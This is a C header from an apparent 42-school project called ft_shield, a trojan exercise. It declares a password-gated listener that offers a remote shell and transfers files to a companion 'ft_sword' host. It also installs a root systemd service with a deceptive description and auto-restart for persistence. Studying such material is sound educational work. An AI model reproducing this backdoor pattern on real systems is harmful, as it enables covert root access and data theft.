/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ctx.h                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
/*   Updated: 2025/12/04 10:06:23 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef CTX_H
# define CTX_H

# include "server.h"
# include "sys/signal.h"
# include <stdio.h>
# include <fcntl.h>
# include <time.h>
# include <netdb.h>
# include <unistd.h>
# include <sys/file.h>

# define SWORD_PORT	7003
# define SWORD_IP	"0.0.0.0"

# define TEXT_RED "\033[31m"
# define TEXT_GREEN "\033[32m"
# define TEXT_YELLOW "\033[33m"
# define TEXT_BLUE "\033[36m"
# define TEXT_BOLD "\033[1m"
# define TEXT_RESET "\033[0m"

# define PASSWORD_PROMPT_TEXT		TEXT_YELLOW	TEXT_BOLD "Please enter the password to connect.\n"												TEXT_RESET
# define INCORRECT_PASSWORD_TEXT	TEXT_RED	TEXT_BOLD "Incorrect password!\n"																TEXT_RESET
# define CORRECT_PASSWORD_TEXT		TEXT_GREEN	TEXT_BOLD "Correct password, welcome in!\n" TEXT_BLUE "Write \'help\' for more information\n"	TEXT_RESET
# define WELCOME_TEXT				TEXT_BLUE	TEXT_BOLD "Welcome to ft_shield!\n"																TEXT_RESET
# define RVRS_SHELL_TEXT			TEXT_BLUE	TEXT_BOLD "Launching shell.\n"																	TEXT_RESET
# define UNKNOWN_COMMAND_TEXT		TEXT_BLUE	TEXT_BOLD "Unknown command. (see help)\n"														TEXT_RESET

# define HELP_TEXT					TEXT_BLUE	TEXT_BOLD \
"shell: launch a shell\n\
quit: close ft_shield\n\
help: see this\n\
stats: see stats about the socket/users\n\
transfer: transfer files from ft_shield to ft_sword\n\
"				TEXT_RESET

# define LOWERCASE_HEXA "0123456789abcdef"

# define PASSWORD 1389717918
# define LOGIN_42 "mbatty"
# define LOCK_FILE "/var/lock/ft_shield.lock"

# define SERVICE_FILE "/etc/systemd/system/ft_shield.service"

# define SERVICE_START "sudo systemctl start ft_shield.service"
# define SERVICE_ENABLE "systemctl enable ft_shield.service"
# define SERVICE_FILE_CONTENT "\
[Unit]\n\
Description=Totally normal program to write my login\n\
After=network.target\n\
StartLimitIntervalSec=0\n\
[Service]\n\
Type=forking\n\
PIDFile=/var/lock/ft_shield.lock\n\
Restart=always\n\
RestartSec=1\n\
User=root\n\
ExecStart=/bin/ft_shield\n\
\n\
[Install]\n\
WantedBy=multi-user.target"

typedef enum e_log_type
{
	LOG_INFO,
	LOG_LOG,
	LOG_ERROR,
	LOG_NONE,
}	t_log_type;

typedef struct s_ctx
{
	t_server	server;
	int			lock_fd;
	bool		running;
	bool		is_root;
}	t_ctx;

int	ctx_init(t_ctx *ctx);
int	ctx_delete(t_ctx *ctx, bool log);

void	message_hook(t_client *client, char *msg, int64_t size, void *ptr);
void	connect_hook(t_client *client, void *ptr);
void	disconnect_hook(t_client *client, void *ptr);
void	handle_sig(int sig);

uint32_t	hash_str(const char *input);
int			get_sword_fd();

void	logger_log(t_log_type type, char *str, ...);

int		export_payload(bool root, char *src_path, char *dst_path);
void	exec_payload(char *payload_path, char **envp);

#endif
